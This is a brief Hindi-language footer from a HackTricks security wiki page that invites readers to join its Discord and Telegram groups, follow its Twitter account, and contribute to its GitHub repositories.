* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को डाउनलोड करें।**

</details>
